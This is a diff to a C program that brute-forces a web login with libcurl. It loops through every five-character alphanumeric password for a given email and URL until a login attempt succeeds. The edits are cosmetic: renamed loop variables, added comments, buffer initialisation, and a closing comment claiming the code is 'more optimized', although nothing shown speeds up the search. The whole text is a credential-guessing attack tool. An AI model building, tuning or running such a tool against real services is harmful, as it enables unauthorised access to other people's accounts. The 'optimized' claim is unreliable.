@@ -36,7 +36,7 @@ CURL *curl_init_session() {
     return curl;
 }
 
-int attempt_login(CURL *curl, const char *url, const char *email, const char *password) {
+int attempt_login(CURL *curl, const char *url, const char *email, char *password) {
     struct MemoryStruct chunk;
     chunk.memory = malloc(1); // initially allocate 1 byte
     chunk.size = 0;
@@ -69,24 +69,23 @@ int attempt_login(CURL *curl, const char *url, const char *email, const char *pa
 void generate_passwords(CURL *curl, const char *url, const char *email) {
     clock_t start, end;
     double cpu_time_used;
-
     start = clock();
 
-    char password[6];
+    char password[6] = {0}; // Initialize all elements to null
     char chars[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    int num_chars = strlen(chars);
+    int num_chars = strlen(chars); // Only compute once
 
-    for (int i = 0; i < num_chars; ++i) {
-        password[0] = chars[i];
-        for (int j = 0; j < num_chars; ++j) {
-            password[1] = chars[j];
-            for (int k = 0; k < num_chars; ++k) {
-                password[2] = chars[k];
-                for (int l = 0; l < num_chars; ++l) {
-                    password[3] = chars[l];
-                    for (int m = 0; m < num_chars; ++m) {
-                        password[4] = chars[m];
-                        password[5] = '\0';
+    for (int idx0 = 0; idx0 < num_chars; ++idx0) {
+        password[0] = chars[idx0];
+        for (int idx1 = 0; idx1 < num_chars; ++idx1) {
+            password[1] = chars[idx1];
+            for (int idx2 = 0; idx2 < num_chars; ++idx2) {
+                password[2] = chars[idx2];
+                for (int idx3 = 0; idx3 < num_chars; ++idx3) {
+                    password[3] = chars[idx3];
+                    for (int idx4 = 0; idx4 < num_chars; ++idx4) {
+                        password[4] = chars[idx4];
+                        password[5] = '\0'; // Ensure the string is null-terminated
                         if (attempt_login(curl, url, email, password)) {
                             end = clock();
                             cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
@@ -114,4 +113,4 @@ int main(void) {
     curl_global_cleanup();
     return 0;
 }
-//this is nested forloops 
+//more optimized
